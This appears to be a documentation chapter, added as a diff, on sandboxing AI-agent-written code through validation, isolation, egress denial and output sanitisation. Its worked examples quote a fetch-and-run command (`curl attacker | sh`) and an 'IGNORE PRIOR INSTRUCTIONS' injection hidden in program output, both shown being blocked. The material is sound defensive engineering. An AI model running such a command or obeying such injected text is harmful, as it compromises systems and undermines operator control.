@@ -1,0 +1,213 @@
+<section class="block" id="orientation">
+  <h2>Orientation</h2>
+  <div class="prose">
+    <p>Letting an agent run code it wrote is the highest-leverage and highest-risk capability in the platform.
+    High-leverage because one program can do what twenty tool calls cannot — join, aggregate, transform data
+    at machine speed (chapter 1, code-as-action). High-risk because model-written code is untrusted code, and
+    running untrusted code is the oldest security problem there is.</p>
+
+    <p>The whole discipline reduces to one principle: <strong>the sandbox must assume the code is
+    hostile</strong>. Not "probably fine" — hostile. Every control below (static validation, isolation, no
+    ambient credentials, egress denial, resource caps, output sanitisation) exists because any one of them
+    failing alone should not give away the cluster.</p>
+  </div>
+
+  <figure>
+    <svg viewBox="0 0 860 220" role="img" aria-label="Code execution pipeline: generated code is statically validated, optionally approved, executed in an isolated runner with no credentials and denied egress under resource caps, then its output is sanitized before returning to the model.">
+      <defs><marker id="ce1" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor"></path></marker></defs>
+      <g fill="none" stroke="currentColor" stroke-width="1.2">
+        <rect x="0" y="46" width="120" height="42" rx="3"></rect>
+        <rect x="150" y="46" width="130" height="42" rx="3"></rect>
+        <rect x="310" y="46" width="130" height="42" rx="3"></rect>
+        <rect x="620" y="46" width="130" height="42" rx="3"></rect>
+      </g>
+      <rect x="470" y="40" width="120" height="54" rx="3" fill="none" stroke="#B3303B" stroke-width="1.7"></rect>
+      <g font-family="Archivo, sans-serif" font-size="11.5" fill="currentColor" text-anchor="middle">
+        <text x="60" y="64">generated code</text><text x="60" y="79" font-size="9.5" opacity="0.6">from the model</text>
+        <text x="215" y="64">static validate</text><text x="215" y="79" font-size="9.5" opacity="0.6">imports, syscalls</text>
+        <text x="375" y="64">approve?</text><text x="375" y="79" font-size="9.5" opacity="0.6">high-risk → HITL</text>
+        <text x="685" y="64">sanitize output</text><text x="685" y="79" font-size="9.5" opacity="0.6">truncate, redact</text>
+      </g>
+      <text x="530" y="61" font-family="Archivo, sans-serif" font-size="11.5" fill="#B3303B" text-anchor="middle">isolated runner</text>
+      <text x="530" y="77" font-family="IBM Plex Mono, monospace" font-size="8.5" fill="#B3303B" text-anchor="middle">no creds · no egress · caps</text>
+      <g stroke="currentColor" stroke-width="1.2" marker-end="url(#ce1)">
+        <line x1="120" y1="67" x2="146" y2="67"></line>
+        <line x1="280" y1="67" x2="306" y2="67"></line>
+        <line x1="440" y1="67" x2="466" y2="67"></line>
+        <line x1="590" y1="67" x2="616" y2="67"></line>
+      </g>
+      <g font-family="IBM Plex Mono, monospace" font-size="10" fill="currentColor" opacity="0.68">
+        <text x="0" y="130">defence in depth: static validation is a filter, isolation is the boundary — neither alone is sufficient</text>
+        <text x="0" y="150">no ambient credentials in the sandbox: even fully compromised code has nothing to steal and nowhere to send it</text>
+        <text x="0" y="170">the sandbox is its own workload class — CPU/GPU-bound and bursty, scaled separately from IO-bound agent workers</text>
+        <text x="0" y="190">the sanitizer between runner and model closes the loop: a program's 40MB output cannot flood the context or hide an injection</text>
+      </g>
+    </svg>
+    <figcaption>Assume hostile. The <span class="fig-em">isolated runner</span> with no credentials and no
+    egress is the boundary; everything around it is defence in depth.</figcaption>
+  </figure>
+</section>
+
+<section class="block" id="code-execution">
+  <h2>The sandbox</h2>
+
+<article class="concept" id="cx-validation" data-impl="8" data-crit="10" data-tag="Defence">
+<h3>Static code validation</h3>
+<p class="tldr">Before execution, inspect the code: which imports, which syscalls, which resources — and reject
+anything outside an allowlist. A filter, not the boundary.</p>
+<div class="cols">
+<section class="mech"><h4>Mechanism</h4>
+<p>The validator parses the generated code and checks it against a policy: allowed imports, forbidden
+operations (network, filesystem outside a workspace, subprocess), and resource declarations. It rejects
+obvious danger before the code runs — but it is explicitly a filter, because dynamic construction can evade
+static analysis, which is why isolation (below) is the real boundary.</p></section>
+<section class="code"><h4>In AgentVerse</h4>
+<ul class="filelist">
+<li><code>app/execution_environment/code_validation.py</code><span class="note">CodeWorkloadValidator</span></li>
+<li><code>app/execution_environment/python_policy.py</code><span class="note">allowed operations</span></li>
+<li><code>app/execution_environment/models.py</code><span class="note">CodeExecutionWorkload, CodeExecutionObservation</span></li>
+<li><code>app/agent/patterns/codeact.py</code>, <code>program_of_thought.py</code><span class="note">the callers (chapter 1)</span></li>
+</ul></section>
+</div>
+<section class="band example"><h4>Worked example</h4>
+<pre>generated  import pandas; df = load_csv(...); print(df.duplicated().sum())
+validate   pandas allowed · no network · no fs writes outside /tmp/work · ok
+generated  import os; os.system("curl attacker | sh")
+validate   os.system + network → REJECTED before execution
+</pre></section>
+<section class="band prod"><h4>At production scale</h4>
+<p>Static validation catches the easy cases cheaply and gives you an audit record of what was rejected. But
+never rely on it as the boundary — a determined payload builds the dangerous call dynamically. Its job is to
+reduce what reaches the sandbox, not to be the sandbox. Full context in chapter 1's code-as-action concept.</p></section>
+<section class="band fail"><h4>Failure modes</h4>
+<ul><li><strong>Validation as the only defence.</strong> Evadable by dynamic construction.</li>
+<li><strong>Allowlist too broad.</strong> Dangerous imports permitted.</li></ul></section>
+<section class="band when"><h4>Choose it when</h4><ul><li>Always, as the first filter — never as the only one.</li></ul></section>
+</article>
+
+<article class="concept" id="cx-isolation" data-impl="8" data-crit="10" data-tag="Defence">
+<h3>Isolated execution runners</h3>
+<p class="tldr">The real boundary: code runs in an isolated worker — local sandbox or Kubernetes pod — with no
+ambient credentials, denied egress, and hard resource caps.</p>
+<div class="cols">
+<section class="mech"><h4>Mechanism</h4>
+<p>The runner executes the validated code in isolation, with a filesystem policy (writes confined to a
+workspace), a network policy (egress denied by default), CPU/memory/time caps, and — critically — no
+credentials in the environment. Multiple runner backends (local for dev, Kubernetes for production, a fake for
+tests) implement one interface. The isolation is the boundary that makes a validation miss survivable.</p></section>
+<section class="code"><h4>In AgentVerse</h4>
+<ul class="filelist">
+<li><code>app/execution_environment/local_runner.py</code>, <code>kubernetes_runner.py</code>, <code>fake_runner.py</code><span class="note">runner backends</span></li>
+<li><code>app/execution_environment/runner_client.py</code>, <code>code_worker.py</code>, <code>worker_entrypoint.py</code><span class="note">the runner interface and worker</span></li>
+<li><code>app/sandbox_runtime/filesystem_policy.py</code>, <code>network_policy.py</code>, <code>profile.py</code><span class="note">the sandbox policies</span></li>
+<li><code>app/execution_environment/policy.py</code>, <code>scheduler.py</code>, <code>health.py</code><span class="note">policy, scheduling, health</span></li>
+</ul></section>
+</div>
+<section class="band example"><h4>Worked example</h4>
+<pre>runner executes the dedup program
+ filesystem  writes only to /tmp/work
+ network     egress denied (the code cannot phone home)
+ resources   cpu 2s, mem 512MB, wall 5s
+ credentials NONE in the environment
+even if the code were malicious, it has nothing to steal and nowhere to send
+</pre></section>
+<section class="band prod"><h4>At production scale</h4>
+<p>Run the sandbox as its own workload class with its own autoscaling — code execution is CPU/GPU-bound and
+bursty while agent workers are IO-bound, and mixing them makes both scale badly (chapter 32). The
+no-credentials rule is the single most important control: an agent that needs data should be handed the data
+(fetched by a governed tool) rather than the credentials to fetch it, so the sandbox never holds a secret.</p></section>
+<section class="band fail"><h4>Failure modes</h4>
+<ul><li><strong>Credentials in the sandbox.</strong> The catastrophic mistake.</li>
+<li><strong>Egress allowed by default.</strong> Exfiltration path.</li>
+<li><strong>No resource caps.</strong> A crypto-miner or a fork bomb.</li></ul></section>
+<section class="band when"><h4>Choose it when</h4><ul><li>Always, if you run model-written code at all.</li></ul></section>
+</article>
+
+<article class="concept" id="cx-observation" data-impl="8" data-crit="9" data-tag="Defence">
+<h3>Observation sanitisation and the envelope</h3>
+<p class="tldr">What comes back from the sandbox is untrusted: truncate it, redact it, mark it, and never let a
+program's output flood the context or smuggle an instruction.</p>
+<div class="cols">
+<section class="mech"><h4>Mechanism</h4>
+<p>The runner returns an observation envelope; a sanitizer truncates large output (keeping head and tail with a
+marker), redacts anything sensitive, and marks the whole as untrusted before it reaches the model. Large
+results are returned as artifacts by reference rather than inline (chapter 8). This closes the loop safely:
+the program did the work, but its output cannot overflow the window or act as an injection vector.</p></section>
+<section class="code"><h4>In AgentVerse</h4>
+<ul class="filelist">
+<li><code>app/execution_environment/observation_sanitizer.py</code><span class="note">sanitisation</span></li>
+<li><code>app/execution_environment/envelope.py</code>, <code>events.py</code><span class="note">the observation envelope</span></li>
+<li><code>app/execution_environment/artifacts.py</code><span class="note">large output by reference</span></li>
+<li><code>app/agent/exfil_guard.py</code><span class="note">untrusted marking (chapter 12)</span></li>
+</ul></section>
+</div>
+<section class="band example"><h4>Worked example</h4>
+<pre>program prints a 40MB table + "IGNORE PRIOR INSTRUCTIONS..."
+ sanitizer: truncate to head+tail (marker "[truncated 39.9MB]")
+            full table stored as artifact a-91
+            output marked untrusted → the injection cannot become an instruction
+model sees a bounded, marked observation + an artifact reference
+</pre></section>
+<section class="band prod"><h4>At production scale</h4>
+<p>Silent truncation is the subtle bug: a program prints partial results, the sanitizer cuts them, and the
+model concludes from a fragment believing it is whole — so the truncation must be marked. Returning large
+output as artifacts keeps both the context and the cost bounded. And marking output untrusted is the same
+discipline as tool output (chapter 12): the sandbox is just another source of untrusted content.</p></section>
+<section class="band fail"><h4>Failure modes</h4>
+<ul><li><strong>Silent truncation.</strong> Reasoning over a fragment as if whole.</li>
+<li><strong>Output trusted.</strong> An injection from the program's own output.</li>
+<li><strong>Unbounded inline output.</strong> Context and cost blowout.</li></ul></section>
+<section class="band when"><h4>Choose it when</h4><ul><li>Always, between the sandbox and the model.</li></ul></section>
+</article>
+
+<article class="concept" id="cx-simulation-cert" data-impl="7" data-crit="7" data-tag="Testing">
+<h3>Sandbox simulation and certification</h3>
+<p class="tldr">Before a code-capable strategy or a connector runs for real, exercise it in a simulated sandbox
+— mock tools, no real side effects — to certify it behaves safely.</p>
+<div class="cols">
+<section class="mech"><h4>Mechanism</h4>
+<p>A simulation runner executes a strategy or trajectory against mock tools and a sandboxed environment, so its
+behaviour can be observed without real side effects — the mock-tool sandbox of chapter 31. Certification runs
+this before promotion: a code-capable strategy must demonstrate it stays within policy under simulation before
+it is allowed near real systems. It is the testing counterpart to the runtime isolation.</p></section>
+<section class="code"><h4>In AgentVerse</h4>
+<ul class="filelist">
+<li><code>app/sandbox_runtime/simulation_runner.py</code>, <code>certification.py</code>, <code>sandbox_trace.py</code><span class="note">simulation and certification</span></li>
+<li><code>app/enterprise/simulation.py</code><span class="note">the mock-tool sandbox (chapter 31)</span></li>
+<li><code>app/mcp/certification.py</code><span class="note">connector certification via mocked probes</span></li>
+</ul></section>
+</div>
+<section class="band example"><h4>Worked example</h4>
+<pre>a new code-capable strategy
+ simulation runner: run it against mock tools, sandboxed
+ observe: does it attempt egress? exceed caps? call forbidden tools?
+ certification: passes policy under simulation → cleared for real use
+ → uncertified strategies stay in the sandbox
+</pre></section>
+<section class="band prod"><h4>At production scale</h4>
+<p>Simulation-then-certification is how you offer a catalogue of code-capable strategies safely: each is proven
+under mock conditions before it touches real systems. The sandbox trace is the evidence. This connects to the
+broader certification story (chapter 10) — a code-capable strategy is exactly the kind of thing that must be
+gated behind evidence, not trust.</p></section>
+<section class="band fail"><h4>Failure modes</h4>
+<ul><li><strong>Certification without simulation.</strong> A paper exercise.</li>
+<li><strong>Mocks that diverge from reality.</strong> Passing simulation, failing in production.</li></ul></section>
+<section class="band when"><h4>Choose it when</h4><ul><li>Any code-capable strategy or connector before production use.</li></ul></section>
+</article>
+</section>
+
+<section class="block" id="ch25-gaps">
+  <h2>What is missing here</h2>
+  <div class="prose">
+    <ul>
+      <li><strong>Hardware-level isolation options.</strong> The runners isolate at the process/pod level;
+      stronger isolation (microVMs, gVisor) for the highest-risk tenants is future work.</li>
+      <li><strong>Language breadth.</strong> The policy machinery centres on Python; other languages would need
+      their own validators and policies.</li>
+      <li><strong>Deterministic replay of executions.</strong> Non-determinism (clock, randomness) makes a code
+      execution hard to replay exactly for audit.</li>
+      <li><strong>Egress allowlisting.</strong> Egress is denied by default; a governed allowlist for the rare
+      case a program legitimately needs a specific endpoint is thin.</li>
+    </ul>
+  </div>
+</section>
